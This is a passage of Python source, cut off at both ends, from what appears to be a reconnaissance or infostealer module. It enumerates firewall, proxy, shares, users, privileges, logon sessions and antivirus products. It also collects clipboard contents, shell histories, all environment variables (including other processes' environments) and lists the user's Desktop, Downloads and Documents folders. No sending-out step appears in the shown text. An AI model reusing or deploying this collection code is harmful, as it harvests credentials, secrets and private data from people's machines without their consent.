                        result = subprocess.run(['firewall-cmd', '--list-all-zones'], capture_output=True, text=True)
                        if result.returncode == 0:
                            firewall['zones'] = result.stdout
                except:
                    pass
                
                # Check ufw
                try:
                    result = subprocess.run(['ufw', 'status'], capture_output=True, text=True)
                    if 'Status: active' in result.stdout:
                        firewall['type'] = 'ufw'
                        firewall['enabled'] = True
                except:
                    pass
            
            elif platform.system() == 'Darwin':
                # macOS firewall
                result = subprocess.run(['defaults', 'read', '/Library/Preferences/com.apple.alf'], 
                                      capture_output=True, text=True)
                
                if 'globalstate = 1' in result.stdout:
                    firewall['enabled'] = True
                    firewall['type'] = 'Application Layer Firewall'
        
        except Exception as e:
            logger.error(f"[!] Firewall status error: {e}")
        
        return firewall
    
    def _get_proxy_settings(self) -> Dict[str, Any]:
        """Get proxy settings"""
        proxy = {
            'enabled': False,
            'http': None,
            'https': None,
            'ftp': None,
            'socks': None,
            'exceptions': [],
            'auto_config': False
        }
        
        try:
            if platform.system() == 'Windows':
                import winreg
                
                proxy_keys = [
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
                ]
                
                for root, path in proxy_keys:
                    try:
                        key = winreg.OpenKey(root, path)
                        
                        # Proxy enabled
                        try:
                            proxy_enable = winreg.QueryValueEx(key, 'ProxyEnable')[0]
                            proxy['enabled'] = bool(proxy_enable)
                        except:
                            pass
                        
                        # Proxy server
                        try:
                            proxy_server = winreg.QueryValueEx(key, 'ProxyServer')[0]
                            if proxy_server:
                                # Parse server:port format
                                for server in proxy_server.split(';'):
                                    if '=' in server:
                                        protocol, address = server.split('=', 1)
                                        proxy[protocol.lower()] = address
                                    else:
                                        proxy['http'] = server  # Assume HTTP
                        except:
                            pass
                        
                        # Proxy override (exceptions)
                        try:
                            proxy_override = winreg.QueryValueEx(key, 'ProxyOverride')[0]
                            if proxy_override:
                                proxy['exceptions'] = proxy_override.split(';')
                        except:
                            pass
                        
                        # Auto-config
                        try:
                            auto_config_url = winreg.QueryValueEx(key, 'AutoConfigURL')[0]
                            if auto_config_url:
                                proxy['auto_config'] = True
                                proxy['auto_config_url'] = auto_config_url
                        except:
                            pass
                        
                        winreg.CloseKey(key)
                        
                        if proxy['enabled']:
                            break
                            
                    except:
                        continue
            
            elif platform.system() in ['Linux', 'Darwin']:
                # Check environment variables
                env_proxies = {
                    'http': os.environ.get('http_proxy') or os.environ.get('HTTP_PROXY'),
                    'https': os.environ.get('https_proxy') or os.environ.get('HTTPS_PROXY'),
                    'ftp': os.environ.get('ftp_proxy') or os.environ.get('FTP_PROXY'),
                    'all': os.environ.get('all_proxy') or os.environ.get('ALL_PROXY')
                }
                
                for protocol, value in env_proxies.items():
                    if value:
                        proxy['enabled'] = True
                        proxy[protocol] = value
                
                # Check system proxy settings (GNOME/KDE)
                if platform.system() == 'Linux':
                    try:
                        # GNOME
                        result = subprocess.run(['gsettings', 'get', 'org.gnome.system.proxy', 'mode'], 
                                              capture_output=True, text=True)
                        if result.returncode == 0 and 'manual' in result.stdout:
                            proxy['enabled'] = True
                    except:
                        pass
        
        except Exception as e:
            logger.error(f"[!] Proxy settings error: {e}")
        
        return proxy
    
    def _get_network_shares(self) -> List[Dict[str, str]]:
        """Get network shares"""
        shares = []
        
        try:
            if platform.system() == 'Windows':
                import win32net
                
                try:
                    shares_info, _, _ = win32net.NetShareEnum(None, 0)
                    for share in shares_info:
                        shares.append({
                            'name': share['netname'],
                            'path': share['path'],
                            'remark': share['remark'],
                            'type': self._share_type_to_str(share['type'])
                        })
                except:
                    pass
                
                # Also check net view
                try:
                    result = subprocess.run(['net', 'view'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
                    for line in result.stdout.split('\n'):
                        if '\\' in line:
                            parts = line.strip().split()
                            if len(parts) >= 2:
                                shares.append({
                                    'server': parts[0],
                                    'type': 'remote'
                                })
                except:
                    pass
            
            elif platform.system() == 'Linux':
                # Check smb shares
                try:
                    result = subprocess.run(['smbtree'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if '\\\\' in line:
                            shares.append({
                                'path': line.strip(),
                                'type': 'smb'
                            })
                except:
                    pass
                
                # Check NFS
                try:
                    result = subprocess.run(['showmount', '-e', 'localhost'], capture_output=True, text=True)
                    lines = result.stdout.split('\n')[1:]  # Skip header
                    for line in lines:
                        if line.strip():
                            parts = line.split()
                            if len(parts) >= 1:
                                shares.append({
                                    'export': parts[0],
                                    'clients': parts[1] if len(parts) > 1 else '',
                                    'type': 'nfs'
                                })
                except:
                    pass
        
        except Exception as e:
            logger.error(f"[!] Network shares error: {e}")
        
        return shares
    
    def _share_type_to_str(self, share_type: int) -> str:
        """Convert Windows share type to string"""
        types = {
            0: 'Disk Drive',
            1: 'Print Queue',
            2: 'Device',
            3: 'IPC',
            2147483648: 'Disk Drive Admin',
            2147483649: 'Print Queue Admin',
            2147483650: 'Device Admin',
            2147483651: 'IPC Admin'
        }
        return types.get(share_type, f'Unknown ({share_type})')
    
    def _get_listening_ports(self) -> List[Dict[str, Any]]:
        """Get listening ports"""
        listening = []
        
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'LISTEN':
                    port_info = {
                        'protocol': 'TCP' if conn.type == socket.SOCK_STREAM else 'UDP',
                        'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                        'pid': conn.pid,
                        'process_name': None
                    }
                    
                    if conn.pid:
                        try:
                            process = psutil.Process(conn.pid)
                            port_info['process_name'] = process.name()
                            port_info['process_path'] = process.exe()
                        except:
                            pass
                    
                    listening.append(port_info)
        
        except Exception as e:
            logger.error(f"[!] Listening ports error: {e}")
        
        return listening
    
    def _get_network_adapters(self) -> List[Dict[str, Any]]:
        """Get detailed network adapter information"""
        adapters = []
        
        try:
            if platform.system() == 'Windows':
                import wmi
                c = wmi.WMI()
                
                for adapter in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
                    adapter_info = {
                        'description': adapter.Description,
                        'mac_address': adapter.MACAddress,
                        'ip_addresses': list(adapter.IPAddress) if adapter.IPAddress else [],
                        'subnet_masks': list(adapter.IPSubnet) if adapter.IPSubnet else [],
                        'default_gateway': list(adapter.DefaultIPGateway) if adapter.DefaultIPGateway else [],
                        'dns_servers': list(adapter.DNSServerSearchOrder) if adapter.DNSServerSearchOrder else [],
                        'dhcp_enabled': adapter.DHCPEnabled,
                        'dhcp_server': adapter.DHCPServer,
                        'index': adapter.Index,
                        'interface_index': adapter.InterfaceIndex
                    }
                    adapters.append(adapter_info)
            
            elif platform.system() == 'Linux':
                # Use ip command
                result = subprocess.run(['ip', '-o', 'addr', 'show'], capture_output=True, text=True)
                
                current_adapter = None
                for line in result.stdout.split('\n'):
                    if line.strip():
                        parts = line.strip().split()
                        if len(parts) >= 4:
                            adapter_name = parts[1]
                            
                            if not current_adapter or current_adapter['name'] != adapter_name:
                                if current_adapter:
                                    adapters.append(current_adapter)
                                
                                current_adapter = {
                                    'name': adapter_name,
                                    'mac_address': self._get_mac_address(adapter_name),
                                    'ip_addresses': [],
                                    'state': self._get_interface_state(adapter_name)
                                }
                            
                            if parts[2] in ['inet', 'inet6']:
                                ip_info = {
                                    'family': 'IPv4' if parts[2] == 'inet' else 'IPv6',
                                    'address': parts[3].split('/')[0],
                                    'prefix': parts[3].split('/')[1] if '/' in parts[3] else None
                                }
                                current_adapter['ip_addresses'].append(ip_info)
                
                if current_adapter:
                    adapters.append(current_adapter)
        
        except Exception as e:
            logger.error(f"[!] Network adapters error: {e}")
        
        return adapters
    
    def _get_mac_address(self, interface: str) -> Optional[str]:
        """Get MAC address for interface"""
        try:
            if platform.system() == 'Linux':
                mac_path = f'/sys/class/net/{interface}/address'
                if os.path.exists(mac_path):
                    with open(mac_path, 'r') as f:
                        return f.read().strip()
        except:
            pass
        return None
    
    def _get_interface_state(self, interface: str) -> str:
        """Get interface state"""
        try:
            if platform.system() == 'Linux':
                state_path = f'/sys/class/net/{interface}/operstate'
                if os.path.exists(state_path):
                    with open(state_path, 'r') as f:
                        return f.read().strip()
        except:
            pass
        return 'unknown'
    
    def _get_security_info(self) -> Dict[str, Any]:
        """Get security information"""
        logger.debug("[*] Collecting security information")
        
        return {
            'users': self._get_users(),
            'groups': self._get_groups(),
            'privileges': self._get_privileges(),
            'audit_policies': self._get_audit_policies(),
            'logon_sessions': self._get_logon_sessions(),
            'security_products': self._get_security_products(),
            'password_policies': self._get_password_policies(),
            'account_lockout_policies': self._get_account_lockout_policies()
        }
    
    def _get_users(self) -> List[Dict[str, Any]]:
        """Get system users"""
        users = []
        
        try:
            if platform.system() == 'Windows':
                import win32net
                
                try:
                    users_info, _, _ = win32net.NetUserEnum(None, 0)
                    
                    for user in users_info:
                        user_info = {
                            'name': user['name'],
                            'full_name': user.get('full_name', ''),
                            'comment': user.get('comment', ''),
                            'flags': user.get('flags', 0),
                            'last_logon': user.get('last_logon', 0),
                            'bad_password_count': user.get('bad_pw_count', 0),
                            'password_age': user.get('password_age', 0),
                            'password_expired': bool(user.get('password_expired', 0)),
                            'account_disabled': bool(user.get('flags', 0) & 0x2),
                            'account_locked': bool(user.get('flags', 0) & 0x10)
                        }
                        users.append(user_info)
                except:
                    pass
            
            elif platform.system() in ['Linux', 'Darwin']:
                # Read /etc/passwd
                passwd_path = '/etc/passwd'
                if os.path.exists(passwd_path):
                    with open(passwd_path, 'r') as f:
                        for line in f:
                            parts = line.strip().split(':')
                            if len(parts) >= 7:
                                user_info = {
                                    'name': parts[0],
                                    'password': parts[1],
                                    'uid': parts[2],
                                    'gid': parts[3],
                                    'gecos': parts[4],
                                    'home': parts[5],
                                    'shell': parts[6]
                                }
                                
                                # Get additional info from getent if available
                                try:
                                    result = subprocess.run(['getent', 'passwd', parts[0]], 
                                                          capture_output=True, text=True)
                                    if result.returncode == 0:
                                        gecos_parts = parts[4].split(',')
                                        if len(gecos_parts) >= 5:
                                            user_info.update({
                                                'full_name': gecos_parts[0],
                                                'room': gecos_parts[1],
                                                'work_phone': gecos_parts[2],
                                                'home_phone': gecos_parts[3],
                                                'other': gecos_parts[4]
                                            })
                                except:
                                    pass
                                
                                users.append(user_info)
        
        except Exception as e:
            logger.error(f"[!] Users error: {e}")
        
        return users
    
    def _get_groups(self) -> List[Dict[str, Any]]:
        """Get system groups"""
        groups = []
        
        try:
            if platform.system() == 'Windows':
                import win32net
                
                try:
                    groups_info, _, _ = win32net.NetLocalGroupEnum(None, 0)
                    
                    for group in groups_info:
                        group_info = {
                            'name': group['name'],
                            'comment': group.get('comment', '')
                        }
                        
                        # Get group members
                        try:
                            members, _, _ = win32net.NetLocalGroupGetMembers(None, group['name'], 0)
                            group_info['members'] = [m['name'] for m in members]
                        except:
                            group_info['members'] = []
                        
                        groups.append(group_info)
                except:
                    pass
            
            elif platform.system() in ['Linux', 'Darwin']:
                # Read /etc/group
                group_path = '/etc/group'
                if os.path.exists(group_path):
                    with open(group_path, 'r') as f:
                        for line in f:
                            parts = line.strip().split(':')
                            if len(parts) >= 4:
                                groups.append({
                                    'name': parts[0],
                                    'password': parts[1],
                                    'gid': parts[2],
                                    'members': parts[3].split(',') if parts[3] else []
                                })
        
        except Exception as e:
            logger.error(f"[!] Groups error: {e}")
        
        return groups
    
    def _get_privileges(self) -> List[Dict[str, Any]]:
        """Get user privileges"""
        privileges = []
        
        try:
            if platform.system() == 'Windows':
                import win32security
                import win32process
                
                # Get current process token
                process = win32process.GetCurrentProcess()
                token = win32security.OpenProcessToken(process, win32security.TOKEN_QUERY)
                
                # Get privileges
                privs = win32security.GetTokenInformation(token, win32security.TokenPrivileges)
                
                for priv_luid, priv_attr in privs:
                    priv_name = win32security.LookupPrivilegeName(None, priv_luid)
                    
                    privilege_info = {
                        'name': priv_name,
                        'enabled': bool(priv_attr & win32security.SE_PRIVILEGE_ENABLED),
                        'enabled_by_default': bool(priv_attr & win32security.SE_PRIVILEGE_ENABLED_BY_DEFAULT),
                        'used_for_access': bool(priv_attr & win32security.SE_PRIVILEGE_USED_FOR_ACCESS),
                        'attributes': priv_attr
                    }
                    privileges.append(privilege_info)
        
        except Exception as e:
            logger.error(f"[!] Privileges error: {e}")
        
        return privileges
    
    def _get_audit_policies(self) -> Dict[str, Any]:
        """Get audit policies"""
        audit_policies = {}
        
        try:
            if platform.system() == 'Windows':
                import win32security
                
                # Get audit policy
                policy = win32security.LsaQueryInformationPolicy(
                    win32security.LsaOpenPolicy(None, win32security.POLICY_VIEW_AUDIT_INFORMATION),
                    win32security.PolicyAuditEventsInformation
                )
                
                audit_policies = {
                    'auditing_enabled': policy['AuditingMode'] != 0,
                    'audit_events': policy['EventAuditingOptions']
                }
        except:
            pass
        
        return audit_policies
    
    def _get_logon_sessions(self) -> List[Dict[str, Any]]:
        """Get logon sessions"""
        sessions = []
        
        try:
            if platform.system() == 'Windows':
                import win32security
                
                # Get logon sessions
                sessions_list = win32security.LsaEnumerateLogonSessions()
                
                for session in sessions_list:
                    try:
                        session_data = win32security.LsaGetLogonSessionData(session)
                        
                        session_info = {
                            'username': session_data['UserName'],
                            'logon_domain': session_data['LogonDomain'],
                            'authentication_package': session_data['AuthenticationPackage'],
                            'logon_type': self._logon_type_to_str(session_data['LogonType']),
                            'session': session_data['Session'],
                            'logon_time': str(session_data['LogonTime']),
                            'logon_server': session_data['LogonServer'],
                            'dns_domain_name': session_data['DnsDomainName'],
                            'upn': session_data['Upn'],
                            'user_flags': session_data['UserFlags'],
                            'last_successful_logon': str(session_data['LastSuccessfulLogon']),
                            'last_failed_logon': str(session_data['LastFailedLogon']),
                            'failed_logon_count': session_data['FailedLogonCount']
                        }
                        sessions.append(session_info)
                    except:
                        continue
        except:
            pass
        
        return sessions
    
    def _logon_type_to_str(self, logon_type: int) -> str:
        """Convert logon type to string"""
        types = {
            0: 'System',
            2: 'Interactive',
            3: 'Network',
            4: 'Batch',
            5: 'Service',
            6: 'Proxy',
            7: 'Unlock',
            8: 'NetworkCleartext',
            9: 'NewCredentials',
            10: 'RemoteInteractive',
            11: 'CachedInteractive',
            12: 'CachedRemoteInteractive',
            13: 'CachedUnlock'
        }
        return types.get(logon_type, f'Unknown ({logon_type})')
    
    def _get_security_products(self) -> List[Dict[str, Any]]:
        """Get security products (antivirus, firewall, etc.)"""
        products = []
        
        try:
            if platform.system() == 'Windows':
                import wmi
                
                c = wmi.WMI()
                
                # Antivirus products
                for av in c.Win32_Product(Description="%antivirus%") or []:
                    products.append({
                        'type': 'antivirus',
                        'name': av.Name,
                        'version': av.Version,
                        'vendor': av.Vendor,
                        'install_date': av.InstallDate,
                        'install_location': av.InstallLocation
                    })
                
                # Firewall products
                for fw in c.Win32_Product(Description="%firewall%") or []:
                    products.append({
                        'type': 'firewall',
                        'name': fw.Name,
                        'version': fw.Version,
                        'vendor': fw.Vendor
                    })
                
                # Windows Defender specific check
                try:
                    for item in c.Win32_ComputerSystemProduct():
                        if 'defender' in item.Name.lower():
                            products.append({
                                'type': 'antivirus',
                                'name': 'Windows Defender',
                                'version': 'Built-in',
                                'vendor': 'Microsoft'
                            })
                except:
                    pass
        except:
            pass
        
        return products
    
    def _get_password_policies(self) -> Dict[str, Any]:
        """Get password policies"""
        policies = {}
        
        try:
            if platform.system() == 'Windows':
                import win32security
                import win32net
                
                # Get domain password policy
                try:
                    policy = win32net.NetUserModalsGet(None, 0)
                    policies.update({
                        'min_password_length': policy['min_password_len'],
                        'max_password_age': policy['max_password_age'],
                        'min_password_age': policy['min_password_age'],
                        'password_history_length': policy['password_hist_len'],
                        'lockout_threshold': policy['lockout_threshold'],
                        'lockout_duration': policy['lockout_duration'],
                        'lockout_observation_window': policy['lockout_observation_window']
                    })
                except:
                    pass
                
                # Get account policies
                try:
                    policy = win32security.LsaQueryInformationPolicy(
                        win32security.LsaOpenPolicy(None, win32security.POLICY_VIEW_LOCAL_INFORMATION),
                        win32security.PolicyAccountDomainInformation
                    )
                    policies['domain_name'] = policy['DomainName']
                except:
                    pass
        except:
            pass
        
        return policies
    
    def _get_account_lockout_policies(self) -> Dict[str, Any]:
        """Get account lockout policies"""
        lockout = {}
        
        try:
            if platform.system() == 'Windows':
                import win32net
                
                try:
                    policy = win32net.NetUserModalsGet(None, 3)  # USER_MODALS_INFO_3
                    lockout.update({
                        'lockout_duration': policy['lockout_duration'],
                        'lockout_observation_window': policy['lockout_observation_window'],
                        'lockout_threshold': policy['lockout_threshold']
                    })
                except:
                    pass
        except:
            pass
        
        return lockout
    
    def _get_user_info(self) -> Dict[str, Any]:
        """Get current user information"""
        logger.debug("[*] Collecting user information")
        
        user_info = {
            'username': getpass.getuser(),
            'home_directory': os.path.expanduser('~'),
            'user_id': os.getuid() if hasattr(os, 'getuid') else None,
            'group_id': os.getgid() if hasattr(os, 'getgid') else None,
            'effective_user_id': os.geteuid() if hasattr(os, 'geteuid') else None,
            'effective_group_id': os.getegid() if hasattr(os, 'getegid') else None,
            'environment_variables': dict(os.environ),
            'recent_files': self._get_recent_files(),
            'clipboard_history': self._get_clipboard_history(),
            'shell_history': self._get_shell_history(),
            'desktop_files': self._get_desktop_files(),
            'downloads': self._get_downloads(),
            'documents': self._get_documents()
        }
        
        # Get user privileges
        try:
            if platform.system() == 'Windows':
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                user_info['is_administrator'] = is_admin
            else:
                user_info['is_administrator'] = os.geteuid() == 0
        except:
            user_info['is_administrator'] = False
        
        # Get session information
        try:
            if platform.system() == 'Windows':
                import win32ts
                session_id = win32ts.WTSGetActiveConsoleSessionId()
                user_info['session_id'] = session_id
                
                # Get session information
                sessions = win32ts.WTSEnumerateSessions(win32ts.WTS_CURRENT_SERVER_HANDLE)
                for session in sessions:
                    if session['SessionId'] == session_id:
                        user_info['session_name'] = session['pWinStationName']
                        user_info['session_state'] = session['State']
                        break
        except:
            pass
        
        # Get login time
        try:
            if platform.system() == 'Windows':
                import win32security
                import win32process
                
                process = win32process.GetCurrentProcess()
                token = win32security.OpenProcessToken(process, win32security.TOKEN_QUERY)
                token_info = win32security.GetTokenInformation(token, win32security.TokenStatistics)
                user_info['authentication_id'] = token_info['AuthenticationId'].HighPart
                user_info['token_type'] = token_info['TokenType']
        except:
            pass
        
        return user_info
    
    def _get_recent_files(self) -> List[str]:
        """Get recent files"""
        recent_files = []
        
        try:
            if platform.system() == 'Windows':
                recent_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Recent')
                if os.path.exists(recent_path):
                    for item in os.listdir(recent_path)[:50]:  # Limit to 50
                        item_path = os.path.join(recent_path, item)
                        if os.path.isfile(item_path):
                            recent_files.append(item)
            
            elif platform.system() == 'Linux':
                recent_path = os.path.expanduser('~/.local/share/recently-used.xbel')
                if os.path.exists(recent_path):
                    try:
                        import xml.etree.ElementTree as ET
                        tree = ET.parse(recent_path)
                        root = tree.getroot()
                        
                        for bookmark in root.findall('.//bookmark'):
                            href = bookmark.get('href')
                            if href and href.startswith('file://'):
                                file_path = href[7:]  # Remove 'file://'
                                recent_files.append(file_path)
                                
                                if len(recent_files) >= 50:
                                    break
                    except:
                        pass
            
            elif platform.system() == 'Darwin':
                recent_path = os.path.expanduser('~/Library/Application Support/com.apple.sharedfilelist/')
                if os.path.exists(recent_path):
                    for root, dirs, files in os.walk(recent_path):
                        for file in files:
                            if file.endswith('.sfl2'):
                                # macOS uses binary property lists for recent files
                                # This is simplified - in reality would need to parse binary plist
                                recent_files.append(file)
                                if len(recent_files) >= 20:
                                    break
                        if len(recent_files) >= 20:
                            break
        
        except Exception as e:
            logger.debug(f"[!] Recent files error: {e}")
        
        return recent_files
    
    def _get_clipboard_history(self) -> List[str]:
        """Get clipboard history (limited)"""
        clipboard = []
        
        try:
            import pyperclip
            content = pyperclip.paste()
            if content and len(content) < 10000:  # Limit size
                # Take first 1000 characters
                preview = content[:1000]
                clipboard.append({
                    'content': preview,
                    'length': len(content),
                    'truncated': len(content) > 1000
                })
        except:
            pass
        
        return clipboard
    
    def _get_shell_history(self) -> Dict[str, List[str]]:
        """Get shell history"""
        history = {}
        
        try:
            # Bash history
            bash_history = os.path.expanduser('~/.bash_history')
            if os.path.exists(bash_history):
                try:
                    with open(bash_history, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()[-100:]  # Last 100 commands
                        history['bash'] = [line.strip() for line in lines]
                except:
                    pass
            
            # Zsh history
            zsh_history = os.path.expanduser('~/.zsh_history')
            if os.path.exists(zsh_history):
                try:
                    with open(zsh_history, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()[-100:]
                        history['zsh'] = [line.strip() for line in lines]
                except:
                    pass
            
            # PowerShell history (Windows)
            if platform.system() == 'Windows':
                ps_history = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'PowerShell', 'PSReadLine', 'ConsoleHost_history.txt')
                if os.path.exists(ps_history):
                    try:
                        with open(ps_history, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = f.readlines()[-100:]
                            history['powershell'] = [line.strip() for line in lines]
                    except:
                        pass
        
        except Exception as e:
            logger.debug(f"[!] Shell history error: {e}")
        
        return history
    
    def _get_desktop_files(self) -> List[str]:
        """Get desktop files"""
        desktop_files = []
        
        try:
            if platform.system() == 'Windows':
                desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            else:
                desktop_path = os.path.expanduser('~/Desktop')
            
            if os.path.exists(desktop_path):
                for item in os.listdir(desktop_path)[:50]:  # Limit to 50
                    desktop_files.append(item)
        
        except:
            pass
        
        return desktop_files
    
    def _get_downloads(self) -> List[str]:
        """Get downloads directory contents"""
        downloads = []
        
        try:
            if platform.system() == 'Windows':
                downloads_path = os.path.join(os.environ['USERPROFILE'], 'Downloads')
            else:
                downloads_path = os.path.expanduser('~/Downloads')
            
            if os.path.exists(downloads_path):
                for item in os.listdir(downloads_path)[:50]:  # Limit to 50
                    downloads.append(item)
        
        except:
            pass
        
        return downloads
    
    def _get_documents(self) -> List[str]:
        """Get documents directory contents"""
        documents = []
        
        try:
            if platform.system() == 'Windows':
                docs_path = os.path.join(os.environ['USERPROFILE'], 'Documents')
            else:
                docs_path = os.path.expanduser('~/Documents')
            
            if os.path.exists(docs_path):
                for item in os.listdir(docs_path)[:50]:  # Limit to 50
                    documents.append(item)
        
        except:
            pass
        
        return documents
    
    def _get_process_info(self) -> Dict[str, Any]:
        """Get process information"""
        logger.debug("[*] Collecting process information")
        
        processes = []
        
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 
                                           'memory_percent', 'create_time', 'status',
                                           'cmdline', 'exe', 'cwd', 'connections',
                                           'open_files', 'threads', 'nice', 'ionice']):
                try:
                    proc_info = proc.info
                    
                    # Add additional information
                    with proc.oneshot():
                        try:
                            proc_info['cpu_times'] = proc.cpu_times()._asdict()
                        except:
                            proc_info['cpu_times'] = None
                        
                        try:
                            proc_info['memory_info'] = proc.memory_info()._asdict()
                        except:
                            proc_info['memory_info'] = None
                        
                        try:
                            proc_info['io_counters'] = proc.io_counters()._asdict() if proc.io_counters() else None
                        except:
                            proc_info['io_counters'] = None
                        
                        proc_info['num_threads'] = proc.num_threads()
                        
                        if hasattr(proc, 'num_handles'):
                            proc_info['num_handles'] = proc.num_handles()
                        
                        # Get parent process
                        try:
                            parent = proc.parent()
                            if parent:
                                proc_info['parent_pid'] = parent.pid
                                proc_info['parent_name'] = parent.name()
                        except:
                            pass
                        
                        # Get environment variables
                        try:
                            proc_info['environ'] = dict(proc.environ())
                        except:
                            pass
                    
                    processes.append(proc_info)
                    
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                except Exception as e:
                    logger.debug(f"[!] Process info error for PID {proc.pid if hasattr(proc, 'pid') else 'unknown'}: {e}")
                    continue
                
                # Limit to 200 processes for performance
                if len(processes) >= 200:
                    break
        
        except Exception as e:
            logger.error(f"[!] Process collection error: {e}")
        
        # Sort by memory usage
        processes.sort(key=lambda x: x.get('memory_percent', 0) or 0, reverse=True)
        
        # Get process tree
        process_tree = self._get_process_tree(processes[:50])  # Top 50 processes
        
        return {
            'total_processes': len(processes),
            'processes': processes[:100],  # Return top 100 by memory
            'process_tree': process_tree,
            'system_processes': len([p for p in processes if p.get('username') == 'SYSTEM' or p.get('username') == 'root']),
            'user_processes': len([p for p in processes if p.get('username') not in ['SYSTEM', 'root', None]])
        }
    
    def _get_process_tree(self, processes: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Get process tree structure"""
        tree = {'root': [], 'orphans': []}
        
        try:
            # Create mapping of PID to process
            process_map = {p['pid']: p for p in processes}
            
            # Find root processes (no parent in our list)
            for proc in processes:
                parent_pid = proc.get('parent_pid')
                if parent_pid is None or parent_pid not in process_map:
                    tree['root'].append({
                        'pid': proc['pid'],
                        'name': proc['name'],
                        'children': []
                    })
            
            # Build tree recursively
            def add_children(parent_node, parent_pid):
                for proc in processes:
                    if proc.get('parent_pid') == parent_pid:
                        child_node = {
                            'pid': proc['pid'],
                            'name': proc['name'],
                            'children': []
                        }
                        parent_node['children'].append(child_node)
                        add_children(child_node, proc['pid'])
            
            for root_node in tree['root']:
                add_children(root_node, root_node['pid'])
            
            # Find orphans (processes whose parent is not in our list)
            for proc in processes:
                parent_pid = proc.get('parent_pid')
                if parent_pid and parent_pid not in process_map:
                    # Check if this proc is already in tree
                    in_tree = False
                    def check_in_tree(node, target_pid):
                        if node['pid'] == target_pid:
                            return True
                        for child in node['children']:
                            if check_in_tree(child, target_pid):
                                return True
                        return False
                    
                    for root_node in tree['root']:
                        if check_in_tree(root_node, proc['pid']):
                            in_tree = True
                            break
                    
                    if not in_tree:
                        tree['orphans'].append({
                            'pid': proc['pid'],
                            'name': proc['name'],
                            'parent_pid': parent_pid
                        })
        
        except Exception as e:
            logger.debug(f"[!] Process tree error: {e}")
        
        return tree
    
    def _get_performance_info(self) -> Dict[str, Any]:
        """Get performance information"""
        logger.debug("[*] Collecting performance information")
        
        performance = {}
        
        try:
            # CPU
            cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
            performance['cpu'] = {
                'percent': cpu_percent,
                'percent_total': sum(cpu_percent) / len(cpu_percent) if cpu_percent else 0,
                'frequency': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None,
                'load_average': os.getloadavg() if hasattr(os, 'getloadavg') else None,
                'stats': psutil.cpu_stats()._asdict(),
                'times_percent': psutil.cpu_times_percent()._asdict()
            }
            
            # Memory
            virtual = psutil.virtual_memory()
            swap = psutil.swap_memory()
            
            performance['memory'] = {
                'virtual': {
                    'percent': virtual.percent,
                    'used': virtual.used,
                    'available': virtual.available,
                    'free': virtual.free
                },
                'swap': {
                    'percent': swap.percent,
                    'used': swap.used,
                    'free': swap.free
                }
            }
            
            # Disk
            disk_io = psutil.disk_io_counters()
            if disk_io:
                performance['disk'] = {
                    'io': disk_io._asdict(),
                    'usage': {}
                }
                
                # Get usage for major partitions
                for partition in psutil.disk_partitions()[:5]:  # First 5 partitions
                    try:
                        usage = psutil.disk_usage(partition.mountpoint)
                        performance['disk']['usage'][partition.mountpoint] = {
                            'percent': usage.percent,
                            'used': usage.used,
                            'free': usage.free
                        }
                    except:
                        pass
            
            # Network
            net_io = psutil.net_io_counters()
            if net_io:
                performance['network'] = {
                    'io': net_io._asdict(),
                    'connections': len(psutil.net_connections()),
                    'iface_stats': {}
                }
                
                # Get per-interface stats
                iface_stats = psutil.net_io_counters(pernic=True)
                for iface, stats in iface_stats.items():
                    performance['network']['iface_stats'][iface] = stats._asdict()
            
            # System uptime
            performance['uptime'] = {
                'seconds': time.time() - psutil.boot_time(),
                'boot_time': datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat()
            }
            
            # Process counts
            performance['processes'] = {
                'total': len(psutil.pids()),
                'running': len([p for p in psutil.process_iter(['status']) if p.info.get('status') == 'running']),
                'sleeping': len([p for p in psutil.process_iter(['status']) if p.info.get('status') == 'sleeping']),
                'stopped': len([p for p in psutil.process_iter(['status']) if p.info.get('status') == 'stopped'])
            }
            
        except Exception as e:
            logger.error(f"[!] Performance info error: {e}")
            performance['error'] = str(e)
        
        return performance
    
    def _get_environment_info(self) -> Dict[str, Any]:
        """Get environment information"""
        logger.debug("[*] Collecting environment information")
        
        env_info = {
            'python_environment': {
                'executable': sys.executable,
                'version': sys.version,
                'version_info': {
                    'major': sys.version_info.major,
                    'minor': sys.version_info.minor,
                    'micro': sys.version_info.micro,
                    'releaselevel': sys.version_info.releaselevel,
                    'serial': sys.version_info.serial
                },
                'path': sys.path,
                'prefix': sys.prefix,
                'base_prefix': getattr(sys, 'base_prefix', sys.prefix),
                'exec_prefix': sys.exec_prefix,
                'platform': sys.platform,
                'implementation': platform.python_implementation(),
                'compiler': platform.python_compiler(),
                'build': platform.python_build()
            },
            'working_directory': os.getcwd(),
            'temp_directories': {
                'temp': os.environ.get('TEMP'),
                'tmp': os.environ.get('TMP'),
                'tmpdir': os.environ.get('TMPDIR'),
                'tempdir': os.environ.get('TEMPDIR')
            },
            'system_path': os.environ.get('PATH', '').split(os.pathsep),
            'processor_architecture': platform.architecture()[0],
            'machine': platform.machine(),
            'node': platform.node(),
            'platform': platform.platform(),
            'uname': platform.uname()._asdict(),
            'system_alias': platform.system_alias(platform.system(), platform.release(), platform.version()),
            'libc_version': platform.libc_ver() if hasattr(platform, 'libc_ver') else None
        }
        
        # Shell information
        env_info['shell'] = {
            'shell': os.environ.get('SHELL'),
            'term': os.environ.get('TERM'),
            'display': os.environ.get('DISPLAY'),
            'session_manager': os.environ.get('SESSION_MANAGER')
        }
        
        # Development environment
        env_info['development'] = {
